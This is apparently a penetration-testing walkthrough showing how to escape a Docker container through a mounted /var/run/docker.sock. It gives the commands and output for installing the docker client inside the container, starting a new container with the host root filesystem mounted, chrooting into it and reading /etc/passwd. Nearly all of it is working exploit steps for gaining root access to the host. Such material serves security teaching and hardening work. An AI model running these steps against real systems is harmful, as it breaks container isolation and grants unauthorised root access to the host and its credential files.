# Escape from a docker container with a mounted docker socket.

* Look for docker.sock in /var/run :

```bash
ls /var/run | grep docker.sock
```
Output:
```
pentester@NotSoSecure:~$ ls /var/run | grep docker.sock
docker.sock
pentester@NotSoSecure:~$
```
* Run a container by mounting the docker socket by running the below command:
```bash
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest bash
```
The above command will create a container using the latest ubuntu image and this container now will be able to communicate with the docker daemon running on the host. However, the container does not have docker installed by default.

Output:
```
pentester@NotSoSecure:~$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest bash
root@70b64558e239:/# docker --version
bash: docker: command not found
root@70b64558e239:/#
```
* To install docker we run the following commands in the container:
```bash
apt-get update 
```
```bash
apt-get install docker.io
```
* To confirm if docker is running re-run ```docker --version``` in the container. 
```bash
root@70b64558e239:/# docker --version
Docker version 20.10.12, build 20.10.12-0ubuntu4
root@70b64558e239:/#
```
* Running docker images will list all the available images on the host.

```bash
root@70b64558e239:/# docker images
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
tomcat-sample   latest    bd638a673943   13 hours ago   680MB
ubuntu          latest    2dc39ba059dc   16 hours ago   77.8MB
alpine          latest    9c6f07244728   3 weeks ago    5.54MB
tomcat          9.0.62    5e9a4d049871   3 months ago   680MB
root@70b64558e239:/# docker ps -a
CONTAINER ID   IMAGE           COMMAND   CREATED         STATUS         PORTS     NAMES
70b64558e239   ubuntu:latest   "bash"    7 minutes ago   Up 7 minutes             elastic_panini
root@70b64558e239:/#
```
* Start a container by mounting the host file system as shown below:
```bash
docker run -it -v /:/host ubuntu bash
```
* To list the files on the host run ls -l /host 
```bash
root@70b64558e239:/# docker run -it -v /:/host ubuntu bash
root@2cd3a44dcb45:/# ls -la /host/
total 2097244
drwxr-xr-x  23 root root       4096 Aug 26 09:57 .
drwxr-xr-x   1 root root       4096 Sep  2 16:08 ..
drwxr-xr-x   2 root root       4096 Mar 20 08:11 bin
drwxr-xr-x   3 root root       4096 Aug 26 09:57 boot
drwxr-xr-x  18 root root       3780 Sep  1 16:09 dev
drwxr-xr-x  93 root root       4096 Aug 26 10:17 etc
drwxr-xr-x   3 root root       4096 Mar 20 08:07 home
lrwxrwxrwx   1 root root         34 Mar 20 08:04 initrd.img -> boot/initrd.img-4.15.0-171-generic
lrwxrwxrwx   1 root root         34 Mar 20 08:04 initrd.img.old -> boot/initrd.img-4.15.0-171-generic
drwxr-xr-x  19 root root       4096 Aug 26 10:07 lib
drwxr-xr-x   2 root root       4096 Mar 20 08:05 lib64
drwx------   2 root root      16384 Mar 20 08:01 lost+found
drwxr-xr-x   2 root root       4096 Mar 20 08:13 media
drwxr-xr-x   2 root root       4096 Mar 20 08:02 mnt
drwxr-xr-x   4 root root       4096 Aug 26 10:07 opt
dr-xr-xr-x 106 root root          0 Sep  1 16:10 proc
drwx------   3 root root       4096 Aug 26 10:18 root
drwxr-xr-x  22 root root        720 Sep  2 04:00 run
drwxr-xr-x   2 root root       4096 Sep  1 16:10 sbin
drwxr-xr-x   2 root root       4096 Mar 20 08:02 srv
-rw-------   1 root root 2147483648 Mar 20 08:01 swapfile
dr-xr-xr-x  13 root root          0 Sep  2 05:24 sys
drwxrwxrwt  11 root root       4096 Sep  2 16:08 tmp
drwxr-xr-x  10 root root       4096 Mar 20 08:02 usr
drwxr-xr-x   2 root root       4096 Aug 26 09:57 vagrant
drwxr-xr-x  11 root root       4096 Mar 20 08:02 var
lrwxrwxrwx   1 root root         31 Mar 20 08:04 vmlinuz -> boot/vmlinuz-4.15.0-171-generic
lrwxrwxrwx   1 root root         31 Mar 20 08:04 vmlinuz.old -> boot/vmlinuz-4.15.0-171-generic
root@2cd3a44dcb45:/#
```
* Chroot into the Host by running ```chroot /host bash ```
* Run ```cat /etc/passwd``` Now we have access to the host system via a container.

Output:
```bash
root@2cd3a44dcb45:/# chroot /host bash
root@2cd3a44dcb45:/# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
pentester:x:1000:1000:pentester,,,:/home/pentester:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
ntp:x:108:114::/nonexistent:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
root@2cd3a44dcb45:/#
```
